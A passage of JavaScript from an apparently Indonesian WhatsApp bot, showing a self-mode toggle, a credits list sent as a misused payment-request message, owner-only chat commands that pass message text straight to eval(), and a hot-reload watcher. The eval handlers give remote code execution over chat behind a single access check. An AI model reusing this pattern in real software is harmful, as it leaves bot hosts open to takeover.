            if (!botNumber) return m.reply(mess.message) 
            FadelSM.public = false
            m.reply(`Sukses Mode Self`)
        }
        break;
     

case 'tqto': {
let buy = `
*\`▧ 「 𝗧𝗛𝗔𝗡𝗞𝗦 𝗧𝗢 𝗠𝗬 𝗙𝗥𝗜𝗘𝗡𝗗𝗦 」\`*
╭━─━❀
┃ FadelSM (Pengembang) 
┃ Riska (My Lovers) 
┃ Denny (Friend) 
┃ Alpin (Friend) 
┃ Aqsho (Friend) 
┃ Kaizi (Friend) 
┃ RilzX7 (Friend) 
┃ WeenZ (Friend) 
┃ DrayXD (Friend) 
┃ Aima (Friend) 
┃ Kayzen (Friend) 
┃ Langit (Friend) 
┃ Daffa (Friend) 
┃ Yuukey (Friend) 
┃ Hendzy (Friend) 
┃ 𝑨𝑭𝑮𝑨𝑵 (Friend) 
┃ Swiper (Friend) 
┃ WynzTizi (Friend) 
┃ Nted (Friend) 
┃ Rapip (Friend)
┃ Raplii (Friend) 
┃ Yukina (Friend) 
┃ YorieIcy (Friend)
┃ Corzza (Friend)
┃TyarHost (Friend)
┃Laxy (Friend)
┃Ikhsan (Friend)
┃ All Buyer FadelSM
┃ ALL Pengikut Saluran FadelSM
╰━─────━❍`
FadelSM.relayMessage(m.chat, {
 requestPaymentMessage: {
 currencyCodeIso4217: 'THANKS TO',
 amount1000: 1000,
 requestFrom: `@${m.sender.split('@')}`,
 noteMessage: {
 extendedTextMessage: {
 text: buy,
 contextInfo: {
 externalAdReply: {
 showAdAttribution: true
 }}}}}}, {})

}
       
default:
if (budy.startsWith('>')) {
if (!Access) return;
try {
let evaled = await eval(budy.slice(2));
if (typeof evaled !== 'string') evaled = require('util').inspect(evaled);
await m.reply(evaled);
} catch (err) {
m.reply(String(err));
}
}
        
if (budy.startsWith('<')) {
if (!Access) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await m.reply(require('util').format(teks))
}
}
        
}
} catch (err) {
console.log(require("util").format(err));
}
}

let file = require.resolve(__filename);
require('fs').watchFile(file, () => {
require('fs').unwatchFile(file);
console.log('\x1b[0;32m' + __filename + ' \x1b[1;32mupdated!\x1b[0m');
delete require.cache[file];
require(file);
})
